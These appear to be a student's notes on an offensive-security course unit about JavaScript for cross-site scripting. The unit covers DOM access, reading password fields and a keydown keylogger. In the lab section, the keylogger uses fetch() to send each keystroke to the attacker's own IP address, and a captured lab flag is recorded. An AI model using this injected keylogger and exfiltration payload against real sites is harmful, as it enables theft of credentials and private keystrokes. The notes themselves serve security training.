This Learning Unit covers the following Learning Objectives:

1. Understand fundamentals of JavaScript
2. Read and understand basic JavaScript code
3. Use JavaScript APIs to exfiltrate data

JavaScript is a high-level programming language that has become one of the fundamental components of modern web applications. All modern browsers include a JavaScript engine that runs any client-side JavaScript code. This Learning Unit is an introduction to some features and syntax of JavaScript that are useful for security professionals to know.

When a browser processes an HTTP response containing HTML, the browser creates a _Document Object Model_ (DOM) tree and renders it. The DOM includes all forms, inputs, images, etc. on a page. JavaScript can access and modify the page's DOM, resulting in a more interactive experience for end users. From a vulnerability exploitation perspective, this also means that if we can inject JavaScript, we can access and modify the page's DOM. With access to the DOM, we can redirect login forms, extract passwords, phish users, and much more.

Let's review a JavaScript function[1](https://portal.offsec.com/courses/web-200-28380/learning/cross-site-scripting-introduction-and-discovery-30964/javascript-basics-for-offensive-uses-31294/javascript-basics-for-offensive-uses-31389#fn-local_id_524-1) that processes some data and logs it to the console.

```javascript
  function processData(data) {
    data.items.forEach(item => {
      console.log(item)
   });
  }

  let foo = {
    items: [
      "Hello",
      "Zdravo",
      "Hola"
    ]
  }

processData(foo)
```

In Listing 2, we find a declaration of a function named _processData_ on lines 1-5. On lines 7-13, we find the declaration of an object saved into the _foo_ variable. On line 15, we find the calling of the _processData_ function using the _foo_ variable as an argument.

A _function_ is a series of statements. Typically, a function may accept some arguments, accomplish a specified task, and then, if needed, return the processed data.

A _variable_ stores a value. This could be a string ("hello, world"), an array ([1,2,3]), an object (as shown on lines 7-13), or a number of other property types. An _object_ contains key-value pairs called _properties_. In Listing 2, the _foo_ object contains a single key (_items_), which is set to an array of strings.

Functions can also be properties in objects. In these situations, the function is called a _method_. We'll use the term "method" in this Learning Module to use the accurate terminology. However, we can think of a method as a function.

Let's review the contents of the _processData_ function to understand how it works. On line 2, a loop begins with each item in the _data.items_ array. On line 3, each line will be logged to the console.

To understand what the console is, we need to understand how we can execute JavaScript. This will be immensely helpful when we are attempting to test a payload. Being that JavaScript was initially designed to be run in a client's browser, the best debugging tool is actually the browser.

We can open the developer tools on any page; however, some pages might have libraries loaded that change the default behavior of an application. For this reason, we will use the about:blank page in Firefox to load a blank page. Once we've navigated to the blank page, we'll click on the "hamburger" icon on the top right, click _Web Developer_, and finally, click on _Web Console_.

Another short cut is by clicking `CTRL + SHIFT + K` to bring up the web console
![[Pasted image 20240720221312.png]]
executing the `javascript` code above in the web console after `allow pasting` executes and shows the correct results of the foo variable beign spit out
![[Pasted image 20240720221627.png]]

When we paste the code and press `I`, the code is executed and the console logs three string outputs. How did the browser know to log the output when we never defined what "console.log" is supposed to do?

Our code executes because _console.log_ is a built-in method within the _console_ API[2](https://portal.offsec.com/courses/web-200-28380/learning/cross-site-scripting-introduction-and-discovery-30964/javascript-basics-for-offensive-uses-31294/syntax-overview-31089#fn-local_id_524-2) provided by the browser. We have access to many useful Web APIs if we're exploiting a vulnerability we can inject JavaScript into. A couple other common ones are the Window[3](https://portal.offsec.com/courses/web-200-28380/learning/cross-site-scripting-introduction-and-discovery-30964/javascript-basics-for-offensive-uses-31294/syntax-overview-31089#fn-local_id_524-3) and Document[4](https://portal.offsec.com/courses/web-200-28380/learning/cross-site-scripting-introduction-and-discovery-30964/javascript-basics-for-offensive-uses-31294/syntax-overview-31089#fn-local_id_524-4) APIs.

----------
1 (Mozilla, 2021), [https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Functions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Functions) [↩︎](https://portal.offsec.com/courses/web-200-28380/learning/cross-site-scripting-introduction-and-discovery-30964/javascript-basics-for-offensive-uses-31294/syntax-overview-31089#fnref-local_id_524-1)

2 (Mozilla, 2021), [https://developer.mozilla.org/en-US/docs/Web/API](https://developer.mozilla.org/en-US/docs/Web/API) [↩︎](https://portal.offsec.com/courses/web-200-28380/learning/cross-site-scripting-introduction-and-discovery-30964/javascript-basics-for-offensive-uses-31294/syntax-overview-31089#fnref-local_id_524-2)

3 (Mozilla, 2021), [https://developer.mozilla.org/en-US/docs/Web/API/Window](https://developer.mozilla.org/en-US/docs/Web/API/Window) [↩︎](https://portal.offsec.com/courses/web-200-28380/learning/cross-site-scripting-introduction-and-discovery-30964/javascript-basics-for-offensive-uses-31294/syntax-overview-31089#fnref-local_id_524-3)

4 (Mozilla, 2021), [https://developer.mozilla.org/en-US/docs/Web/API/Document](https://developer.mozilla.org/en-US/docs/Web/API/Document) [↩︎](https://portal.offsec.com/courses/web-200-28380/learning/cross-site-scripting-introduction-and-discovery-30964/javascript-basics-for-offensive-uses-31294/syntax-overview-31089#fnref-local_id_524-4)

--------------------------------------------------
#### 4.2.2 Useful API's

The Window API represents the window in which the document lives. Among many other properties, it gives us access to the URL via the _location_ property [1](https://portal.offsec.com/courses/web-200-28380/learning/cross-site-scripting-introduction-and-discovery-30964/javascript-basics-for-offensive-uses-31294/syntax-overview-31089#fn-local_id_535-1) and _localStorage_, [2](https://portal.offsec.com/courses/web-200-28380/learning/cross-site-scripting-introduction-and-discovery-30964/javascript-basics-for-offensive-uses-31294/syntax-overview-31089#fn-local_id_535-2) which may contain secrets.

In addition to the properties, the Window API also provides us with access to the _alert()_ method. This method is very commonly used to demonstrate that an application is vulnerable to XSS. We can access it via _window.alert()_ or just _alert()_.

Any property in the Window API can be treated as a _global_ variable. This means that instead of typing "window.alert", we can just use "alert" as a shortcut.

Let's try to run the _alert_ method in our console. We'll pass in a string to be the content that will be displayed.
![[Pasted image 20240720225814.png]]

While _alert_ might be the most common method used to prove an XSS vulnerability, the most effective API for actually exploiting an application vulnerable to XSS is the _Document_ API. The Document API allows us to interface with the DOM, which contains every part of the page loaded in the user's browser, including all text and password inputs, cookies, and even _keypress_ events.

To interface with the Document API, we'll need a page with more content. We'll use the `http://xss-sandbox/info` site for this. We'll start by navigating to the page and opening the web console.

![[Pasted image 20240720225943.png]]
Let's extract the value out of the username and password input boxes. We'll first have to query for the input boxes. To do that, we'll use the documentation for the Document API[3](https://portal.offsec.com/courses/web-200-28380/learning/cross-site-scripting-introduction-and-discovery-30964/javascript-basics-for-offensive-uses-31294/useful-apis-31082#fn-local_id_535-3) to find a function that lets us query HTML tags.

In the documentation, we find the _getElementsByTagName()_ method, which, given an HTML tag name, will return an array of all elements that match the tag. In HTML, text boxes are created using the _input_ tag. This will be the argument we pass into the method.

We'll save the returned array into a variable called _inputs_. To accomplish this, we'll run `let inputs = document.getElementsByTagName("input")` in the console.

Setting Inputs
![[Pasted image 20240720230423.png]]
Next, we'll loop through the elements in the _inputs_ variable and extract their value. We'll use console.log(input.value) to log their value to the console.

Logging Inputs
```javascript
for (let input of inputs){
console. log(input. value)

}
```

The For loop sets a variable input for each item in the inputs array and logs the value using each input. However, since the inputs are empty, we get `empty string` as the response. Refresh the page, enter a value into the input, enter our `JS` into the console again, and review the output.

![[Pasted image 20240720230702.png]]
Now I entered the credentials `admin` & `notmypassword` into the field and reran the `JS` and was able to see it
![[Pasted image 20240720231221.png]]
Even though the password is obscured, JavaScript has access to the text value. While we're capturing our own credentials here, this would be very useful if we can execute JavaScript in another user's browser.

Another useful API is the ability to add an event listener for every keypress. This can be used to snoop on a victim's messages and credentials. Adding an event listener is done with the _document.addEventListener()_ method. It accepts an event code[4](https://portal.offsec.com/courses/web-200-28380/learning/cross-site-scripting-introduction-and-discovery-30964/javascript-basics-for-offensive-uses-31294/useful-apis-31082#fn-local_id_535-4) ("keydown" for keypresses) and a function on how to handle the event. Let's first create a function that will log keypresses to the console.

```js
function logKey(event){
	console.log(event.key)

}
```
addEventListener - keydown variable
![[Pasted image 20240720231732.png]]
we defined a function named _logKey_ that accepts an event sent by the event listener. Finally, the function logs to the console which key was pressed as part of the event.

With the function complete, all that's left is to add the event listener and pass it our function. We won't add the parentheses as they will execute the function and pass in its returned value, which is nothing in this case. Instead, we pass the _logKey_ variable, which holds the function. The event listener will execute the function each time a key is pressed.
```js
document.addEventListener('keydown', logKey);
```
Now when we type anywhere on the document (not in the console), we can find the keys logged in the console.

Capturing Keystrokes
![[Pasted image 20240720232501.png]]
However, capturing our own keypresses isn't very useful so instead, we want to try to capture other users' keystrokes. For this reason, we've created the _eval_ application within the XSS Sandbox. Any JavaScript entered here will be executed by the victim when we render. Let's take our keylogger and send it to the user.

We'll start by visiting the XSS Sandbox on the eval application, which can be found at `http://xss-sandbox/challenge/eval`. Next, we'll type our payload into the code block within the hacker browser.

-----------
##### Lab starts here
Full Payload
```js
function logKey(event){
	console.log(event.key)

}

document.addEventListener('keydown', logKey);
```
Rendering Evaluation
![[Pasted image 20240720233002.png]]
The victim rendered the page, but nothing happened. This is because we're only logging the keystrokes to the console and we don't have access to the victim's browser console. We're going to need to find a way to exfiltrate their keystrokes. This is where the Fetch API comes in handy.

The _Fetch_[5](https://portal.offsec.com/courses/web-200-28380/learning/cross-site-scripting-introduction-and-discovery-30964/javascript-basics-for-offensive-uses-31294/useful-apis-31082#fn-local_id_635-5) API allows us to have the user's browser make network requests for remote resources. This could be for fetching documents, user information, images, and much more. The Fetch API call is non-blocking, which means that the UI will not be locked up while the request is made and the response is returned. This also means that Fetch doesn't return the data immediately, and instead, it returns a _promise_[6](https://portal.offsec.com/courses/web-200-28380/learning/cross-site-scripting-introduction-and-discovery-30964/javascript-basics-for-offensive-uses-31294/useful-apis-31082#fn-local_id_635-6) to complete the execution. If we need to access the response, we use the _then_ method and pass in a function to execute when the response is available.

However, we don't always need the response. For example, we can use it as a way to exfiltrate data from the user's browser to our Kali machine. As long as the request is sent to our server, we don't need to handle the response in the user's browser. Let's start a Python HTTP listener on Kali to log requests to the terminal by running python3, passing the http.server module using the -m flag along with 80 as the port number.

```bash
python3 -m http.server 80
```

![[Pasted image 20240720233252.png]]
Now we'll go back to using the console window in a blank tab and make an HTTP call to our Kali IP using fetch.
```js
fetch('http://192.168.45.215/hello')
```
in the `about:blank` console
![[Pasted image 20240720233549.png]]
We receive an error stating that "The Same Origin Policy disallows reading the remote resource". However, if we check the Python server logs, we find that we received a request!
![[Pasted image 20240720233847.png]]
Original Keylogging payload
```js
function logKey(event){
	console.log(event.key)
}

document.addEventListener('keydown', logKey);
```
The problem we ran into with the payload was that _console.log_ doesn't exfiltrate data. Let's replace this line with _fetch_ and use the Eval application to have the victim execute our code.

We'll change the _console.log_ line to run fetch("http://192.168.45.215/k?key=" + event.key);. This will make an HTTP request to our Kali machine and include the key pressed. Let's type this into the Eval application and render with the "Simulate keystrokes" option checked in the XSS Sandbox.

Modified `js` script for Keylogging payload
```js
function logKey(event){
	fetch("http://192.168.45.215/k?key=" + event.key);
}

document.addEventListener('keydown', logKey);
```

Entered the payload @ `http://xss-sandbox/challenge/eval` - simulated keystrokes - hit render 
![[Pasted image 20240720234440.png]]
In my `python3 -m http.server 80`  the keystrokes are sent
`I Like to send flags, yes i do! OS{typetypetype}` is what it says
![[Pasted image 20240720234642.png]]
![[Pasted image 20240720234823.png]]
![[Pasted image 20240720234942.png]]
![[Pasted image 20240720235040.png]]